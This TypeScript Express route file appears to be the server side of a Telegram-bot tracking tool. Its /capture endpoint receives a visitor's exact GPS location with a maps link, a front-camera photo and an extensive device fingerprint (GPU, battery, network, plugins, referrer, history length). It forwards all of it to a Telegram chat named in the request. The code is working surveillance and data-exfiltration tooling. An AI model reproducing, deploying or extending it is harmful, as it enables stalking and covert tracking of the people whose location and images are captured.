import { Router, type IRouter } from "express";
import { sendTextToChat, sendPhotoToChat } from "../lib/telegram";
import { SubmitCaptureBody, SubmitCaptureResponse } from "@workspace/api-zod";

const router: IRouter = Router();

function fmt(val: unknown, unit = ""): string {
  if (val == null) return "N/A";
  return `${val}${unit}`;
}

router.post("/capture", async (req, res): Promise<void> => {
  const parsed = SubmitCaptureBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const { chatId, photo, location, deviceInfo: d } = parsed.data;

  try {
    // ── Location ─────────────────────────────────────────────
    let locMsg = "📍 *Location*\n";
    if (location && location.latitude != null && location.longitude != null) {
      const lat = location.latitude;
      const lng = location.longitude;
      locMsg += `• Latitude: \`${lat.toFixed(6)}\`\n`;
      locMsg += `• Longitude: \`${lng.toFixed(6)}\`\n`;
      if (location.accuracy != null) locMsg += `• Accuracy: ±${Math.round(location.accuracy)}m\n`;
      if (location.altitude != null) locMsg += `• Altitude: ${location.altitude.toFixed(1)}m\n`;
      if (location.speed != null && location.speed > 0) locMsg += `• Speed: ${location.speed.toFixed(1)} m/s\n`;
      locMsg += `• Maps: https://maps.google.com/?q=${lat},${lng}\n`;
    } else {
      locMsg += "• Permission denied\n";
    }

    // ── Device Info ───────────────────────────────────────────
    let devMsg = "📱 *Device & Browser*\n";
    if (d) {
      devMsg += `• User Agent: \`${(d.userAgent ?? "").slice(0, 120)}\`\n`;
      devMsg += `• Platform: ${fmt(d.platform)}\n`;
      devMsg += `• Vendor: ${fmt(d.vendor)}\n`;
      devMsg += `• Language: ${fmt(d.language)} | All: ${(d.languages ?? []).join(", ") || "N/A"}\n`;
      devMsg += `• Timezone: ${fmt(d.timezone)} (UTC${(d.timezoneOffset ?? 0) <= 0 ? "+" : ""}${-(d.timezoneOffset ?? 0) / 60})\n`;
      devMsg += `• Online: ${d.onLine ? "Yes" : "No"}\n`;
      devMsg += `• Cookies Enabled: ${d.cookieEnabled ? "Yes" : "No"}\n`;
      devMsg += `• Do Not Track: ${fmt(d.doNotTrack)}\n`;

      devMsg += `\n🖥️ *Hardware*\n`;
      devMsg += `• CPU Cores: ${fmt(d.hardwareConcurrency)}\n`;
      devMsg += `• Device Memory: ${d.deviceMemory != null ? `${d.deviceMemory}GB` : "N/A"}\n`;
      devMsg += `• Max Touch Points: ${fmt(d.maxTouchPoints)}\n`;
      devMsg += `• GPU Renderer: ${fmt(d.gpuRenderer)}\n`;
      devMsg += `• GPU Vendor: ${fmt(d.gpuVendor)}\n`;
      devMsg += `• WebGL: ${d.webglSupported ? "Supported" : "Not supported"}\n`;
      devMsg += `• WebAssembly: ${d.webAssemblySupported ? "Supported" : "Not supported"}\n`;

      devMsg += `\n📺 *Screen & Display*\n`;
      devMsg += `• Screen: ${fmt(d.screenWidth)}×${fmt(d.screenHeight)} (avail: ${fmt(d.screenAvailWidth)}×${fmt(d.screenAvailHeight)})\n`;
      devMsg += `• Window: ${fmt(d.innerWidth)}×${fmt(d.innerHeight)}\n`;
      devMsg += `• Color Depth: ${fmt(d.colorDepth)}bit | Pixel Depth: ${fmt(d.pixelDepth)}bit\n`;
      devMsg += `• Device Pixel Ratio: ${fmt(d.devicePixelRatio)}\n`;
      devMsg += `• Orientation: ${fmt(d.orientationType)} (${fmt(d.orientationAngle)}°)\n`;

      devMsg += `\n🔋 *Battery*\n`;
      devMsg += `• Level: ${d.battery != null ? `${d.battery}%` : "N/A"}\n`;
      devMsg += `• Charging: ${d.charging != null ? (d.charging ? "Yes" : "No") : "N/A"}\n`;
      if (d.chargingTime != null) devMsg += `• Time to full: ${d.chargingTime}s\n`;
      if (d.dischargingTime != null) devMsg += `• Time to empty: ${d.dischargingTime}s\n`;

      devMsg += `\n🌐 *Network*\n`;
      devMsg += `• Connection Type: ${fmt(d.connectionType)}\n`;
      devMsg += `• Downlink: ${d.connectionDownlink != null ? `${d.connectionDownlink}Mbps` : "N/A"}\n`;
      devMsg += `• RTT: ${d.connectionRtt != null ? `${d.connectionRtt}ms` : "N/A"}\n`;
      devMsg += `• Data Saver: ${d.connectionSaveData != null ? (d.connectionSaveData ? "On" : "Off") : "N/A"}\n`;

      devMsg += `\n🔌 *Media & Permissions*\n`;
      devMsg += `• Cameras: ${fmt(d.cameraCount)}\n`;
      devMsg += `• Microphones: ${fmt(d.microphoneCount)}\n`;
      devMsg += `• Notification Permission: ${fmt(d.notificationPermission)}\n`;
      devMsg += `• Service Worker: ${d.serviceWorkerSupported ? "Yes" : "No"}\n`;
      devMsg += `• PDF Viewer: ${d.pdfViewerEnabled ? "Yes" : "No"}\n`;

      devMsg += `\n💾 *Storage Support*\n`;
      devMsg += `• localStorage: ${d.localStorageEnabled ? "Yes" : "No"}\n`;
      devMsg += `• sessionStorage: ${d.sessionStorageEnabled ? "Yes" : "No"}\n`;
      devMsg += `• IndexedDB: ${d.indexedDbEnabled ? "Yes" : "No"}\n`;

      if (d.pluginsList && d.pluginsList.length > 0) {
        devMsg += `\n🔧 *Browser Plugins (${d.pluginsCount})*\n`;
        devMsg += d.pluginsList.slice(0, 10).map(p => `• ${p}`).join("\n") + "\n";
      }

      devMsg += `\n📄 *Page Info*\n`;
      devMsg += `• Referrer: ${d.referrer || "Direct"}\n`;
      devMsg += `• History Length: ${fmt(d.historyLength)}\n`;
    } else {
      devMsg += "• Not collected\n";
    }

    // Send messages
    await sendTextToChat(chatId, `🆕 *New Data Capture*\n\n${locMsg}`);
    await sendTextToChat(chatId, devMsg);

    if (photo) {
      await sendPhotoToChat(chatId, photo, "📸 Front camera photo");
    } else {
      await sendTextToChat(chatId, "📸 *Photo*\n• Camera permission denied");
    }

    req.log.info({ chatId }, "Capture data sent to Telegram");
    res.json(SubmitCaptureResponse.parse({ success: true, message: "Your data has been sent to the bot successfully!" }));
  } catch (err) {
    req.log.error({ err, chatId }, "Failed to send capture data");
    res.status(500).json({ error: "Failed to send data to Telegram" });
  }
});

export default router;
